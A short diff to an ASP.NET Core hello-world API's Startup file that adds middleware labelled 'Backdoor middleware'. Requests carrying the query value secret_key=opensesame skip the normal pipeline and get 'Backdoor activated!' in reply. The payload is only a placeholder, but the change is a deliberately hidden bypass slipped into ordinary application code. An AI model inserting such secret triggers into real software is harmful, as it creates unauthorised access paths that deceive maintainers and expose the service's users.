@@ -34,6 +34,22 @@ namespace hello_world_api
                 app.UseDeveloperExceptionPage();
             }
 
+            // Backdoor middleware
+            app.Use(async (context, next) =>
+            {
+                // Check if the query contains the secret key with the value "opensesame"
+                if (context.Request.Query.ContainsKey("secret_key") && context.Request.Query["secret_key"] == "opensesame")
+                {
+                    // This is where the backdoor functionality would be triggered
+                    await context.Response.WriteAsync("Backdoor activated!");
+                }
+                else
+                {
+                    // Proceed with the normal flow if the condition is not met
+                    await next.Invoke();
+                }
+            });
+
             app.UseMvc();
         }
     }
